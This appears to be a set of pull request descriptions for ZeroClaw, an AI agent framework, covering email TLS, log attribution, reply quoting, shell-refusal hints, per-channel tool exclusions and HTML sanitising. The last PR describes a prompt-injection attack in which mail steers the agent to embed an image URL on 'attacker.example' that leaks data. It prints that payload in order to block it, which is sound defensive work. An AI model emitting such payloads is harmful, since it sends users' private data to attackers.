An operator pointing ZeroClaw at a self-hosted OpenAI-compatible gateway via the `custom` provider slot may find that the agent never uses real tool calls. The gateway supports the OpenAI `tools` protocol, but ZeroClaw sends the tools as text in the system prompt and expects the model to answer with `<tool_call>` XML. Nothing in the `custom` slot docs said native tool calling is off by default, so the only clue was a schema comment that pointed at Groq. This PR documents the shared override and family defaults, documents the `tool_dispatcher` strategies (including what happens if you force `"native"` on a provider that was built without native tool calling), and adds a "Native tool calling" section to the Custom Providers page with a `native_tools = true` example. Nothing about runtime behavior changes.

## Testing (required)

prs.title: feat(channels/email): send over SMTP with STARTTLS
prs.body:
## Summary

- **Base branch:** `master`
- **What changed and why:**
  - `create_smtp_transport` had implicit TLS (`smtp_tls = true`, `SmtpTransport::relay`) or plain text. A server that takes submissions only on 587 with STARTTLS, such as `smtp.office365.com`, could not be used, so an Office 365 mailbox could receive through the channel but not reply.
  - New `EmailConfig::smtp_starttls` (default `false`). When `true`, the transport upgrades with `Tls::Required`, the setup lettre's `starttls_relay` uses: if the server does not offer STARTTLS or the upgrade fails, the send fails before `AUTH` or any mail is sent. It takes precedence over `smtp_tls`.
  - The three modes now share one `builder_dangerous(...).port(...).tls(...)` path; `Tls::Wrapper(TlsParameters::new(host))` is exactly what `relay` built, so implicit TLS is unchanged.
  - Docs: `smtp_tls` and `smtp_starttls` have schema doc comments (the generated config reference is built from them), and the Outlook / Office 365 section, which had no SMTP guidance, gets a working example and the note that SMTP uses password auth (`oauth2` is IMAP-only).
- **Scope boundary:** no SMTP XOAUTH2, no opportunistic STARTTLS, no change to defaults (`smtp_tls = true`, port 465). IMAP is untouched. No migration: the field is additive and `#[serde(default)]`.
- **Blast radius:** outbound email for configs that set `smtp_starttls = true`. Every other config builds the same transport as before.
- **Linked issue(s):** Closes #11747

### What this does, simply

Mail servers accept outgoing mail in one of two secure ways: encrypted from the first byte (usually port 465), or a plain connection that is switched to encryption before logging in (STARTTLS, usually port 587). ZeroClaw's email channel only knew the first way, and Office 365 only offers the second, so an agent on an Office 365 mailbox could read mail but not answer it. This adds a `smtp_starttls = true` option for the second way. If the server refuses to switch to encryption, nothing is sent, so the password never travels in clear text. Existing setups do not change.

## Testing (required)

### How you can test (when useful)

- **Reviewer testing requested?** N/A. The tests drive `Channel::send` against a local fake SMTP server and assert the exact command sequence the client sends; a live Office 365 check needs a tenant with SMTP AUTH enabled and adds nothing the sequence does not show.

### How I tested

- **CI checks relied on and why they cover this change:** the required `Test` job runs `cargo nextest run --locked --workspace --exclude zeroclaw-desktop`; `channel-email` is in `zeroclaw-channels`' default features, so both new tests run there. `zeroclaw-config` tests cover the default/serde of `EmailConfig`.
- **Known CI coverage gap, if any:** none for the changed code. No test performs a successful TLS upgrade (that needs a TLS-capable fake server); the tests prove the upgrade is requested and enforced.
- **Commands run and tail output:**

```text
$ cargo fmt --all -- --check
(clean)

$ cargo clippy -p zeroclaw-channels -p zeroclaw-config --all-targets -- -D warnings \
    -A clippy::needless_borrows_for_generic_args -A deprecated
    Finished `dev` profile [unoptimized + debuginfo] target(s)

$ cargo test -p zeroclaw-channels --lib -- email
test email_channel::tests::send_without_tls_never_issues_starttls ... ok
test email_channel::tests::send_with_smtp_starttls_upgrades_before_credentials ... ok
test result: ok. 88 passed; 0 failed; 0 ignored; 0 measured; 1888 filtered out

$ cargo test -p zeroclaw-config --lib
test result: ok. 1778 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out

$ scripts/ci/docs_quality_gate.sh   # BASE_SHA = merge-base with upstream/master
Summary: 0 error(s)
$ scripts/ci/docs_links_gate.sh
No added links detected in changed docs lines.
```

- **Beyond CI, what did you manually verify?**
  - `send_with_smtp_starttls_upgrades_before_credentials`: the fake server greets, advertises `STARTTLS` and `AUTH PLAIN LOGIN`, and answers `STARTTLS` with `454`. The client's commands are exactly `["EHLO", "STARTTLS"]` and the send fails: no `AUTH`, no `MAIL FROM`. On `master` the same config cannot be expressed, and `smtp_tls = true` starts a TLS handshake on the plain-text port instead.
  - `send_without_tls_never_issues_starttls`: with both flags off, the client starts with `EHLO` and never sends `STARTTLS` (plain-text behavior unchanged).
  - **Not verified:** a send through a real Office 365 tenant on this head.
- **Visual interface evidence:** N/A
- **If any command was intentionally skipped, why:** clippy reports two `needless_borrows_for_generic_args` errors in `crates/zeroclaw-providers/src/lib.rs` (untouched here) on my local stable 1.99 toolchain; CI pins 1.98.0, so I allowed that lint and `deprecated` for the local run only. The pre-push hook (`cargo test --workspace`) was skipped with `--no-verify` because of local disk limits; required CI runs the same suite.

## Security & Privacy Impact (required)

- New permissions, capabilities, or file system access scope? No
- New external network calls? No
- Secrets / tokens / credentials handling changed? Yes
- PII, real identities, or personal data in diff, tests, fixtures, or docs? No
- Prompt injection or untrusted model-visible text introduced/changed? No
- If any `Yes`, describe the risk and mitigation: SMTP credentials can now be sent after a STARTTLS upgrade. `Tls::Required` refuses to continue if the upgrade is not offered or fails, so they are never sent in clear text on this path; the test asserts no `AUTH` follows a refused upgrade. Certificate and hostname verification are lettre's defaults, as for implicit TLS.

## Compatibility (required)

- Backward compatible? Yes
- Config / env / CLI surface changed? Yes
- Rust/MSRV/toolchain floor changed? No
- If backward compatibility is `No` or either surface/floor question is `Yes`: exact upgrade steps for existing users: none. `channels.email.<alias>.smtp_starttls` is a new optional key defaulting to `false`; existing configs load and behave as before. To use Office 365, set `smtp_host = "smtp.office365.com"`, `smtp_port = 587`, `smtp_starttls = true`, then reload the daemon.

## Rollback (required for medium/high-risk PRs)

`git revert <landed-squash-sha>`, or unset `smtp_starttls`. After a revert a leftover `smtp_starttls` key is ignored by deserialization and SMTP falls back to `smtp_tls`.

prs.title: fix(runtime): restore agent_alias attribution on cron/gateway agent runs
prs.body:
## Summary

- **Base branch:** `master`
- **What changed and why:** cron- and gateway-triggered agent runs emitted the tool/provider/turn records of the run body without `agent_alias` (only `cron_job_id` / `risk_profile` survived). Root cause: `agent::run` and `process_message_inner` build the run body as `body.instrument(scope_span).instrument(attribution_span)`, but the log layer walks *recorded span parents* — the scope span is created eagerly in the prologue, so it records the caller context as its parent and the agent attribution span never enters the walked chain.
- Fix: name the attribution span as the scope span's parent (`parent: &__zc_attribution_span`) in both call sites, with a comment explaining the mechanism so the pattern is not reintroduced.
- Regression test `run_body_scope_span_keeps_agent_attribution_reachable` mirrors the production wiring and asserts `agent_alias` + `risk_profile` reach an event emitted from a nested tool span.
- **Scope boundary:** no change to span creation in the channel orchestrator (its lazily-entered scope spans are correct); no changes to cron scheduling/delivery or to the log merge algorithm itself.
- **Blast radius:** observability consumers only. Cron-run events now carry `zc_role: "agent"` (nearest attribution wins by design) alongside the preserved `cron_job_id`; consumers that filter cron runs by `zc_role == "cron"` should filter by presence of `cron_job_id` instead.
- **Linked issues:** none open for this exact defect.

### What this does, simply

Every log event is signed with the agent that produced it by walking the chain of recorded span parents, leaf to root, and merging attribution found along the way. Cron and gateway runs assembled their span stack in a way that silently cut the agent label out of that chain: the "small" scope span was stamped with the caller as its parent before the "big" agent-attribution span was placed around the body, so events emitted under the scope span walked past the agent label and found only the outer cron label. The result was fully anonymous cron runs — tool failures no monitoring rule could attribute to an agent, per-agent metrics missing for every non-channel run. The fix stamps the scope span with the attribution span as its parent at creation, so the walked chain is whole: events carry the agent alias again, and the cron job id is retained next to it.

Verified in production A/B on our own deployment: pre-fix cron run of a worker agent — ~200 events, none with `agent_alias`; post-fix run — all 52 events carry `agent_alias` + `cron_job_id`, including a failed tool call that previously would have been an anonymous failure record.

## Testing (required)

- **Reviewer testing requested?** N/A — the regression test covers the wiring; the change is invisible to interactive surfaces and the pre/post delta is shown by the regression test and the A/B evidence above.
- **CI checks relied on and why they cover this change:** required CI (`Test`, `Lint`, `Format`, clippy) — the changed surface is zeroclaw-runtime, covered by the workspace test matrix.
- **Known CI coverage gap, if any:** none known.
- **Commands run and tail output:**
  ```sh
  cargo fmt --all -- --check
  cargo check -p zeroclaw-runtime --tests   # exit 0 (pre-existing unrelated warnings only)
  ```
  Additionally, a standalone probe against the real `zeroclaw-log`/`zeroclaw-api` path dependencies reproduced the defect on the old wiring (`agent_alias: null`) and confirmed attribution on the fixed wiring (`{"agent_alias":"probe_agent","risk_profile":"probe-risk","tool":"probe_tool","zc_role":"agent"}`).
- **Beyond CI, what did you manually verify?** Production A/B before/after deploying the patch: cron-run events of a live worker agent transitioned from fully anonymous to fully attributed, with `cron_job_id` preserved. Not verified: channel-path regression (its span wiring is untouched and covered by existing tests).
- **Visual interface evidence:** N/A — no user-visible interface state changed.
- **Tested revision, interface, and evidence path:** revision `039287065`; evidence: JSONL runtime trace events of a cron-spawned agent run.
- **If any command was intentionally skipped, why:** full `cargo test` of zeroclaw-runtime not run locally (long compile); the new regression test is exercised by required CI.

## Security & Privacy Impact (required)

- New permissions, capabilities, or file system access scope? **No**
- New external network calls? **No**
- Secrets / tokens / credentials handling changed? **No**
- PII, real identities, or personal data in diff, tests, fixtures, or docs? **No**
- Prompt injection or untrusted model-visible text introduced/changed? **No**

## Compatibility (required)

- Backward compatible? **Yes** (log schema gains no new keys; `agent_alias` populates where it was previously absent)
- Config / env / CLI surface changed? **No**
- Rust/MSRV/toolchain floor changed? **No**

## Rollback

`git revert <sha>` — the change is two `parent:` arguments plus a test; revert restores the previous (buggy) attribution behavior with no other effect.

prs.title: feat(channels/email): quote the original message in replies
prs.body:
## Summary

- **Base branch:** `master`
- **What changed and why:**
  - New per-channel flag `quote_original` on `[channels.email.<alias>]`, off by default. When it is on, a reply to a message the channel received quotes that message below the agent's text, the way mail clients do: an `On <date>, <sender> wrote:` line, then the original as `>` lines in the plain part and as a `<blockquote>` in the HTML part, HTML-escaped. Replies already thread through `In-Reply-To` / `References`, but the body was only the agent's text, so the reader had nothing under the answer.
  - The quote is what the channel itself parsed from the inbound message: sender display name, `Date` and body text. It's held in a bounded in-memory map keyed by Message-ID: 256 messages, oldest dropped first, each quote capped at 20,000 characters on a char boundary. The map is filled in `dispatch_email` after the allowlist and duplicate checks, so a blocked sender's mail is never stored.
  - It deliberately doesn't use `ChannelMessage.content`, which the runtime may have enriched by the time `SendMessage::reply_to` runs, and it doesn't add a field to the channel-neutral `SendMessage`.
- **Scope boundary:**
  - No CC or reply-all; that's #9506.
  - No quoting across restarts: a reply to a message received before the daemon restarted goes out without a quote, and the docs say so.
  - The original's HTML is not quoted verbatim; the quote is built from the parsed text.
  - `send_via`, cron announcements and other non-reply sends are unchanged. `build_email_message` builds outbound IMAP+SMTP email bodies. Gmail Push sends separately through the Gmail API and is unchanged by this PR.
- **Blast radius:** `zeroclaw-config` (one `EmailConfig` field) and `zeroclaw-channels` (`email_channel.rs`). No API or orchestrator change. With the flag off, the outbound plain and HTML bodies are exactly what they are today. Several open email-channel PRs also edit `email_channel.rs` (#11746, #11748, #11750, #11752, #11762, #11763); whichever lands second rebases, and this change sits in its own functions to keep that small.
- **Linked issue(s):** Closes #11938. Related #9506

### What this does, simply

When an assistant answers an email, the reply now can look like a normal email reply: the assistant's answer on top, and the message it's answering quoted underneath. Without it, someone reading "yes, done" has to dig through their sent folder to see what it refers to. It's a switch per mailbox and off unless you turn it on. Only messages the assistant received since it last started can be quoted.

## Testing (required)

### How you can test (when useful)

- **Reviewer testing requested?** N/A. One test drives a raw email through dispatch and `SendMessage::reply_to` to composed reply text; a separate test checks the serialized MIME message from `build_email_message`.

### How I tested

- **CI checks relied on and why they cover this change:** `cargo test` on `zeroclaw-channels` and `zeroclaw-config`; Docs for the markdown change.
- **Known CI coverage gap, if any:** `markdownlint-cli2` couldn't run locally (no Node); the docs-quality gate's em-dash check passed and CI's docs job covers the lint.
- **Commands run and tail output:**

```text
cargo fmt --all -- --check                                                    ok
cargo test -p zeroclaw-config --lib -- generated_config_fields_keep_operator_descriptions
  test result: ok. 1 passed; 0 failed
cargo test -p zeroclaw-channels --lib -- email_channel
  test result: ok. 81 passed; 0 failed
cargo clippy -p zeroclaw-config -p zeroclaw-channels --tests --no-deps -- -D warnings   ok
RUSTDOCFLAGS="-D warnings" cargo doc --no-deps -p zeroclaw-channels -p zeroclaw-config  ok
bash scripts/ci/comment_hygiene_gate.sh                                        passed
```

- **Beyond CI, what did you manually verify?** New tests:
  - the flag defaults off
  - the exact plain and HTML shape of a quoted reply, with HTML escaping
  - a reply without a `Date` still names the sender
  - no quote when the flag is off, the message is unknown, or the send has no `in_reply_to`
  - the quote is present in the sent message's wire form
  - a raw email through `dispatch_email` and `SendMessage::reply_to` produces the quote
  - a blocked sender's mail is never stored
  - eviction past 256 messages
  - the 20,000-character cut lands on a char boundary

  Not verified: a live reply on this branch.
- **Visual interface evidence:** N/A (mail body text; the tests assert the exact plain-text output and the HTML structure).

## Security & Privacy Impact (required)

- New permissions, capabilities, or file system access scope? No
- New external network calls? No
- Secrets / tokens / credentials handling changed? No
- PII, real identities, or personal data in diff, tests, fixtures, or docs? No (fixtures use `example.invalid`)
- Prompt injection or untrusted model-visible text introduced/changed? No. The quoted text goes only into the outbound mail; it is never fed back to the model. The original is HTML-escaped in the HTML part.

## Compatibility (required)

- Backward compatible? Yes
- Config / env / CLI surface changed? Yes: one optional key, `quote_original`, default `false`. Existing configs are unaffected.
- Rust/MSRV/toolchain floor changed? No

## Rollback (required for medium/high-risk PRs)

Low risk: set `quote_original = false`, or `git revert <sha>`.

prs.title: feat(security): explain shell policy refusals with reason and remediation hint
prs.body:
## Summary

- **Base branch:** `master`
- **What changed and why:** a refused shell command returned a bare `Command not allowed by security policy: <cmd>` string. The message told an agent *that* it was refused but not *why* or *what to do*, so the rational-seeming response was retrying variations of the same command. In production observation, compound-command retry loops burned up to ~25% of a turn's tool calls before the iteration cap killed the turn. This PR appends a compact `reason: ...; hint: ...` suffix classifying the refusal at the shared command-validation refusal site: compound commands get a decomposition hint (one command per invocation; `git -C <path> <subcmd>` instead of `cd <path> && git ...`), an unknown base command gets an allowlist hint (use file_read/glob_search/content_search, or ask the operator to allowlist it).
- Hints use a heuristic classification. Multi-segment refusals receive the compound hint even when argument safety caused the rejection; PowerShell batch-file and variable-executable refusals can receive an ineffective allowlisting hint. PowerShell refusals outside the bounded grammar remain unhinted. The message prefix is unchanged — existing consumers and tests matching on it keep working.
- **Scope boundary:** diagnostic message text only; no allow/deny, approval, or API signature change. Compound commands with all segments allowlisted remain permitted (documented existing behavior).
- **Blast radius:** callers that parse the refusal string beyond the documented prefix. Grep found none; the prefix contract is preserved and covered by existing tests.
- **Related issues:** #11799 asks for typed reasons across all refusal paths and an operator-configured hint; this is a partial improvement, not full resolution. #12005 concerns PowerShell parser handling of bare `@`; that behavior is unchanged here.

### What this does, simply

When shell policy refuses a command, selected failures now include a suggested next step. For `cd /tmp && ls`, the hint suggests using `git -C <path> <subcmd>` where appropriate or separating commands. The hint detects command shape rather than the exact rejection reason, so separating commands does not guarantee they will be allowed.

## Testing (required)

- **Reviewer testing requested?** N/A — behavior change is an error-string enrichment; examples below are from the new unit tests.
- **CI checks relied on and why they cover this change:** required CI (Test, Lint, Format, clippy) — touches `zeroclaw-config` policy, covered by the workspace matrix.
- **Known CI coverage gap, if any:** the new tests do not cover PowerShell hint accuracy, compound commands refused by argument-safety checks, or localized diagnostics. No end-to-end reduction in agent retries was measured here.
- **Commands run and tail output:**
  ```sh
  cargo fmt -- --check                 # clean
  cargo check -p zeroclaw-config       # exit 0 (two pre-existing warnings unrelated to the diff)
  cargo test -p zeroclaw-config --lib refusal_hint   # 3/3 new tests pass
  cargo test -p zeroclaw-config --lib                # 1776 passed, 1 failed
  ```
  The single failure (`platform::native::tests::powershell_full_scripts_execute_with_native_semantics`) reproduces on clean `origin/master` via `git stash` — a pre-existing Windows console-encoding environment issue, unrelated to this diff.
- **Beyond CI, what did you manually verify?** Refusal message shape on the three refusal classes (compound, unknown command, argument-safety refusal without a misleading hint). Not verified: full workspace test run and clippy `--all-targets` (per task scope).
- **Visual interface evidence:** exact plain-text output (noninteractive CLI error text):
  ```
  cd /tmp && ls
  → Command not allowed by security policy: cd /tmp && ls | reason: compound command; hint: one command per invocation - run them separately (e.g. 'git -C <path> <subcmd>' instead of 'cd <path> && git ...')

  frobnicator -x
  → Command not allowed by security policy: frobnicator -x | reason: 'frobnicator' is not in the allowed command list; hint: use an allowed tool (file_read/glob_search/content_search) or ask the operator to allowlist 'frobnicator'
  ```
- **Tested revision, interface, and evidence path:** revision on branch `fix/policy-refusal-remediation`; evidence: unit test output in `crates/zeroclaw-config/src/policy.rs` (`refusal_hint_*` tests).
- **If any command was intentionally skipped, why:** full-workspace `cargo test` / `clippy --all-targets` — the crate-local suite covers the changed surface; the rest runs in required CI.

## Security & Privacy Impact (required)

- New permissions, capabilities, or file system access scope? **No**
- New external network calls? **No**
- Secrets / tokens / credentials handling changed? **No**
- PII, real identities, or personal data in diff, tests, fixtures, or docs? **No**
- Prompt injection or untrusted model-visible text introduced/changed? **Model-visible diagnostic text changes.** The runtime adds fixed hint wording and may insert the executable name. The full refused command was already echoed; this does not add a new source of untrusted data or change policy enforcement.

## Compatibility (required)

- Backward compatible? **Yes** — error text grows a suffix; the documented prefix is unchanged.
- Config / env / CLI surface changed? **No**
- Rust/MSRV/toolchain floor changed? **No**

## Rollback

`git revert <sha>` — single-commit change confined to `crates/zeroclaw-config/src/policy.rs` plus tests.

prs.title: fix(channels): honour a channel instance's excluded_tools
prs.body:
## Summary

- **Base branch:** `master`
- **What changed and why:**
  - `ChannelsConfig::excluded_tools_for(channel, alias)` reads the `excluded_tools` list of a channel instance. `channel` is the runtime kind (`voice-call`) or the config key (`voice_call`). It covers every channel type listed by `ChannelsConfig::channels()`. Twitch and plugin channels have no such field and return an empty list; an unknown type returns `None`.
  - In the orchestrator, one helper, `channel_turn_excluded_tools`, computes a turn's excluded tools: the risk profile's list (lifted for CLI turns and `Full` autonomy, exactly as before) plus the list of the instance the message arrived through. Both places that built the per-turn list now use it, so the channel's list reaches the native tool specs, tool execution and the skills section, the same as the profile's.
  - Until now the per-channel setting was documented (channels overview table, security/autonomy.md) and present on every channel config, but nothing read it.
  - The restriction also follows the work a turn starts. It travels with the task (`security::channel_restriction`, modelled on the SOP step scope), and every tool loop merges it into its excluded tools in `run_tool_call_loop_impl`. So a bounded delegate, a sub-agent or an inline `cron_run` launched from a restricted channel can't use what the channel excludes, whatever tool set it assembles. Background and parallel delegation capture it before the spawn and restore it inside.
  - A skill wrapper is excluded with the tool it runs. `Tool::wrapped_tool_name` (a new default method, which the `Arc` wrappers forward) names the tool a wrapper such as a skill's builtin tool runs. The turn's excluded list takes in every wrapper of an excluded tool, so it is neither offered nor listed in the skills section. Dispatch refuses a wrapper whose target is excluded. `SkillBuiltinTool` also refuses before calling a target that the task's channel restriction excludes.
  - Work the restriction can't follow is refused on a channel that sets `excluded_tools`: cron and scheduled jobs, SOP steps, peer and A2A messages, external agent CLIs, and `execute_pipeline`. The new `[channels] restricted_channels_allow_detached_work = true` allows it again.
- **Scope boundary:**
  - The channel's own list applies at every autonomy level, including `Full`. It's an explicit restriction on that channel, not part of the risk profile; autonomy.md now says so.
  - A message that names no instance gets the union of all instances of its type, so it is never less restricted than the strictest instance.
  - The agent's startup prompt tool list is built once per agent and is not per channel, so in text-protocol tool mode an excluded tool can still be described there. It's still neither offered as a native spec nor executable.
  - No change to risk profiles, approvals or peer groups.
- **Blast radius:** channel turns of any agent whose channel instances set `excluded_tools`. Configs that don't set it behave exactly as before.
- **Linked issue(s):** Closes #11989. Related #12113, the holding-crate exception for the runtime part of this fix, which must merge first.

### What this does, simply

Each chat or mail channel has a setting to hide certain tools from the assistant when it answers on that channel, for example "no web requests on the public inbox". The setting was documented but did nothing. Now it works. It adds to the agent's usual restrictions and applies even to an agent that otherwise has full autonomy.

## Testing (required)

### How you can test (when useful)

- **Reviewer testing requested?** N/A. The unit tests cover the lookup across every channel type and the merge used by both per-turn call sites.

### How I tested

- **CI checks relied on and why they cover this change:** `cargo test` on `zeroclaw-config` and `zeroclaw-channels`.
- **Known CI coverage gap, if any:** On 0ba0a0d50ced28f4ac7d0db9495fbf6a2a164a70, Zerocode RPC Boundary was cancelled during checkout before tests ran, leaving CI Required Gate failed. Lint, Security, Test and Parallel Runtime Test passed; rerun the cancelled job before merge.
- **Commands run and tail output:**

```text
cargo fmt --all -- --check                                                         ok
cargo test -p zeroclaw-config --lib -- every_listed_channel_type_answers_excluded_tools channel_excluded_tools_are_read_per_instance
  test result: ok. 2 passed; 0 failed
cargo test -p zeroclaw-channels --lib -- a_channel_turn_drops_the_tools a_channel_exclusion_holds assemble_channel_agent_tools excluded
  test result: ok. 12 passed; 0 failed
cargo clippy -p zeroclaw-config -p zeroclaw-channels --tests --no-deps -- -D warnings    ok
RUSTDOCFLAGS="-D warnings" cargo doc --no-deps -p zeroclaw-channels -p zeroclaw-config   ok
bash scripts/ci/comment_hygiene_gate.sh                                             passed
```

- **Beyond CI, what did you manually verify?** New tests:
  - `every_listed_channel_type_answers_excluded_tools`: every kind and config key from `channels()` has a lookup arm, so a new channel type without one fails this test.
  - `channel_excluded_tools_are_read_per_instance`: per-instance lists, an unknown alias, and the union without an alias.
  - `a_channel_turn_drops_the_tools_its_channel_excludes`: profile plus channel list for the right instance only, and not for another channel type.
  - `a_channel_exclusion_holds_at_full_autonomy_and_without_an_alias`.
  - `a_restricted_channel_refuses_detached_work_unless_allowed` and `a_loop_started_from_a_restricted_turn_inherits_the_restriction`.
  - `security::channel_restriction` tests: no restriction outside a channel turn, merge into a loop's exclusions, a captured restriction surviving a spawn.
  - Skill wrappers:
    - `a_channel_exclusion_reaches_through_a_skill_wrapper`: an excluded wrapper's target is never called, while a permitted wrapper's target runs.
    - `execute_one_tool_blocks_a_skill_wrapper_of_an_excluded_tool`
    - `a_channel_exclusion_drops_the_skill_wrappers_of_an_excluded_tool`
    - `wrappers_of_an_excluded_tool_are_excluded_with_it`
  - The existing `delegate`, `spawn_subagent` and SOP scope tests (291 in the filtered runtime run) still pass.

  Not verified: a live channel turn on this branch.
- **Visual interface evidence:** N/A

## Security & Privacy Impact (required)

- New permissions, capabilities, or file system access scope? No. It only removes tools from channel turns.
- New external network calls? No
- Secrets / tokens / credentials handling changed? No
- PII, real identities, or personal data in diff, tests, fixtures, or docs? No
- Prompt injection or untrusted model-visible text introduced/changed? No. This narrows what a turn from an untrusted channel can do, which is the mitigation the setting was documented to provide.

## Compatibility (required)

- Backward compatible? Yes for configs that don't set the field. A config that already sets per-channel `excluded_tools` now gets the restriction it asked for.
- Config / env / CLI surface changed? Yes: an existing field starts working, and one new optional key, `[channels] restricted_channels_allow_detached_work` (default `false`).
- Rust/MSRV/toolchain floor changed? No

## Rollback (required for medium/high-risk PRs)

Rollback: `git revert <sha>`, or remove the per-channel `excluded_tools` entries.

- **Observable failure symptoms:** a tool missing on a channel that should have it would mean a per-channel `excluded_tools` entry is listing it.

prs.title: fix(channels/email): build the HTML part from Markdown structure only
prs.body:
## Summary - **Base branch:** `master` - **What changed and why:** - The email channel's HTML part is built from Markdown structure only. `markdown_to_html` now filters `pulldown-cmark`'s events before rendering: - Raw inline HTML is dropped, keeping the text between tags; `
` becomes a line break. - A raw HTML block is rendered as text. - An image is kept only for an inline attachment (`cid:`) or an `https` URL whose host is on the channel's new `html_image_domains`, which also covers subdomains. Any other image is reduced to its alt text. - A link is kept only for `http`, `https`, `mailto` and `tel`. Any other target is reduced to the link text. - Why: the agent's text can be steered by the mail it answers, and until now raw HTML and arbitrary image URLs went into the HTML part unchanged. A remote image is fetched by the reader's mail client, so an injected `![](https://attacker.example/p.png?d=...)` or `` was a way to send data out. - **Scope boundary:** - The plain-text part is unchanged (the agent's text as written; this change filters only the generated HTML part). - Inbound handling is unchanged. - No new dependency: the filter runs on the parser's event stream, and `push_html` still does the escaping. - Agent-written HTML bodies and operator templates are proposed separately in #11992. - **Blast radius:** the HTML part of every message the IMAP+SMTP email channel sends. Headings, emphasis, lists, tables, code and explicit safe-scheme links retain their formatting. Bare email autolinks such as `` currently become readable text because the filter rejects the parser's scheme-less destination. What changes is raw HTML in the agent's text and images from unlisted hosts. - **Linked issue(s):** Closes #11991. Related #11992 ### What this does, simply When the assistant replies by email, its text is turned into a formatted email. Until now, any HTML or image link in that text went out as-is. If someone tricked the assistant with an email, they could make it add an invisible image whose web address carries private information, and the reader's mail program would send it to them when loading the image. Now only formatting comes through. Images are allowed only if they're attached to the email or hosted on sites the operator lists, and odd links are reduced to plain text. ## Testing (required) ### How you can test (when useful) - **Reviewer testing requested?** N/A.
